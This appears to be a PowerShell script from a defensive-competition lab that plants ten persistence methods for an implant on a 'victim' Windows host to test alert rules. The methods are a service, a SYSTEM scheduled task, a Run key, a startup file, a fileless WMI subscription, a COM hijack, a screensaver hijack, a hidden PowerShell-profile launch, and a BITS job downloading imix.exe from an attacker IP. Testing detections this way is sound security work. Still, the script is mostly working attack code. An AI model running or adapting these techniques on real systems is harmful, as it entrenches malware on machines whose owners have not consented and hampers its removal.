# VICTIM - Phase 5 persistence battery (5.1-5.5 + 5.7-5.10). One method at a time;
# the auditor diffs every 30s, so wait ~35s between blocks. Cleanup: 05-full-cleanup.ps1
# Requires implant staged at C:\Users\Public\sysupd.exe (copy from $env:TEMP or attacker share).
param([string]$Attacker = "172.16.69.109")

if (-not (Test-Path C:\Users\Public\sysupd.exe)) {
    Write-Warning "stage the implant first: Copy-Item \\$Attacker\share\imix.exe C:\Users\Public\sysupd.exe"
    exit 1
}

Write-Host "== 5.1 service persistence (expect EVT-7045, PERS-SERVICE) =="
sc.exe create CCDCTestSvc binPath= "C:\Users\Public\sysupd.exe" start= auto | Out-Null
Start-Sleep 35

Write-Host "== 5.2 scheduled task (expect EVT-4698, PERS-TASK; re-launches implant every 5 min) =="
schtasks /create /f /tn "CCDCTestTask" /sc minute /mo 5 /tr "C:\Users\Public\sysupd.exe" /ru SYSTEM | Out-Null
Start-Sleep 35

Write-Host "== 5.3 registry Run key (expect PERS-RUNKEY) =="
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "CCDCTestPayload" -Value "C:\Users\Public\sysupd.exe" -PropertyType String -Force | Out-Null
Start-Sleep 35

Write-Host "== 5.4 startup folder (expect PERS-STARTUP) =="
Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ccdc-test-persistence.bat" "@echo ccdc test"
Start-Sleep 35

Write-Host "== 5.5 WMI event subscription - fileless (expect PERS-WMI-SUB) =="
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
  Name='CCDCImixFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL';
  Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_Processor' AND TargetInstance.PercentProcessorTime > 0"}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
  Name='CCDCImixConsumer'; CommandLineTemplate="C:\Users\Public\sysupd.exe"}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
  Filter=$filter; Consumer=$consumer} | Out-Null
Start-Sleep 35

Write-Host "== 5.7 COM hijack (expect PERS-COM) =="
New-Item -Path "HKCU:\Software\Classes\CLSID\{018D5C66-4533-4307-4C62-71923BBF5B6B}\InprocServer32" -Force | Out-Null
Set-ItemProperty "HKCU:\Software\Classes\CLSID\{018D5C66-4533-4307-4C62-71923BBF5B6B}\InprocServer32" `
  -Name "(default)" -Value "C:\Users\Public\comhost.dll"
Start-Sleep 35

Write-Host "== 5.8 screensaver hijack (expect PERS-SCREENSAVER) =="
Set-ItemProperty "HKCU:\Control Panel\Desktop" -Name SCRNSAVE.EXE -Value "C:\Users\Public\sysupd.exe"
Start-Sleep 35

Write-Host "== 5.9 PowerShell profile hijack (expect PERS-PSPROFILE) =="
New-Item -ItemType Directory -Force "$env:USERPROFILE\Documents\WindowsPowerShell" | Out-Null
Set-Content "$env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" `
  "Start-Process C:\Users\Public\sysupd.exe -WindowStyle Hidden"
Start-Sleep 35

Write-Host "== 5.10 BITS job persistence (expect PERS-BITS) =="
bitsadmin /create CCDCTestJob2 | Out-Null
bitsadmin /addfile CCDCTestJob2 "http://${Attacker}:8000/imix.exe" C:\Users\Public\sysupd2.exe | Out-Null

Write-Host "all persistence planted. run 03-advanced-tests.ps1 or check-alerts.ps1"
